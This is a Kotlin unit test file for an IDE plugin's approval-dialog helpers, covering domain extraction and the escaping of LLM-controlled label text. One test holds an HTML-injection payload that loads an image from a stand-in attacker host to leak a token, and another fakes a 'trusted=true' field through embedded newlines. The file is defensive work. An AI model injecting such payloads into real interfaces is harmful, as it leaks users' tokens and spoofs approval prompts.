package com.workflow.orchestrator.web.ui

import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Test
import org.junit.jupiter.params.ParameterizedTest
import org.junit.jupiter.params.provider.CsvSource

/**
 * Regression tests for two ApprovalDialog helpers:
 *
 *  - [ApprovalDialog.eTldPlus1] — feeds the subdomainGlob checkbox tooltip (S3 fix).
 *  - [ApprovalDialog.safeLabel] — defence-in-depth escaping for LLM-controlled
 *    fields reflected into [com.intellij.ui.components.JBLabel] (post-release 5.2 fix).
 *    A `<html>...<img src=http://attacker/leak>` value must not survive into the label
 *    text in a form that any current or future Swing L&F could parse as HTML, and
 *    embedded `\n` / `\r` must not break dialog layout.
 *
 * We can't crisply unit-test the Swing render from a headless module — manual smoke
 * verifies end-to-end — but the helpers are deterministic and pin the contract.
 */
class ApprovalDialogHelpersTest {

    @ParameterizedTest(name = "eTldPlus1({0}) == {1}")
    @CsvSource(
        "https://example.com/foo,            example.com",
        "https://docs.example.com/path,      example.com",
        "https://a.b.c.example.com/x,        example.com",
        "https://localhost:8080/path,        localhost",
        "not-a-url,                          ''",
    )
    fun `eTldPlus1 returns coarse domain for tooltip display`(url: String, expected: String) {
        assertEquals(expected, ApprovalDialog.eTldPlus1(url))
    }

    @Test
    fun `safeLabel returns empty for null and empty input`() {
        assertEquals("", ApprovalDialog.safeLabel(null))
        assertEquals("", ApprovalDialog.safeLabel(""))
    }

    @Test
    fun `safeLabel leaves benign ASCII unchanged`() {
        assertEquals("https://docs.example.com/path?q=v", ApprovalDialog.safeLabel("https://docs.example.com/path?q=v"))
    }

    @Test
    fun `safeLabel escapes the BasicHTML attack payload`() {
        val attack = "<html><img src='http://attacker/leak?token=x'>"
        val safe = ApprovalDialog.safeLabel(attack)
        // The leading `<` MUST be escaped — otherwise BasicLabelUI.isHTMLString could trip
        // if a future refactor drops the literal "URL: " prefix from the label text.
        assert(!safe.startsWith("<html>")) { "safeLabel must not return a string starting with <html>: $safe" }
        assert("&lt;html&gt;" in safe) { "safeLabel must HTML-escape the <html> token: $safe" }
        assert("&lt;img" in safe) { "safeLabel must HTML-escape <img: $safe" }
        assert("&#39;" in safe) { "safeLabel must HTML-escape apostrophes: $safe" }
    }

    @Test
    fun `safeLabel collapses newlines and tabs into single spaces`() {
        assertEquals("a b c d", ApprovalDialog.safeLabel("a\nb\tc\r\nd"))
        assertEquals("https://example.com FAKE trusted=true", ApprovalDialog.safeLabel("https://example.com\n\n\nFAKE\ttrusted=true"))
    }

    @Test
    fun `safeLabel truncates oversize values to 200 chars before escaping`() {
        val oversize = "x".repeat(500)
        val safe = ApprovalDialog.safeLabel(oversize)
        // The truncation happens BEFORE escape; since `x` has no escape expansion the
        // resulting length is exactly 200.
        assertEquals(200, safe.length)
    }
}
